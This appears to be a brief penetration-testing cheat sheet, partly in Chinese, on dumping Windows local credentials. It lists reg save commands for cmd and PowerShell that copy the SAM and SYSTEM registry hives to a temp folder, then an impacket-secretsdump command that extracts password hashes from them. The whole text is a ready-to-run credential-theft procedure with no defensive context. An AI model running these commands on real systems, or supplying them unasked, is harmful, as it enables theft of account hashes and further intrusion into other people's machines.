How to get SAM AND SYSTEM

- cmd: 
- 
```
reg save HKLM\SAM C:\Windows\Temp\SAM.hive 
```
- 
```
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
```
- 
- PowerShell（在 SYSTEM 权限下）
- 
```
reg.exe save HKLM\SAM C:\Windows\Temp\SAM.hive 

```
- 
```
reg.exe save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
```

 ```
 impacket-secretsdump -sam sam -system system  local
 ```
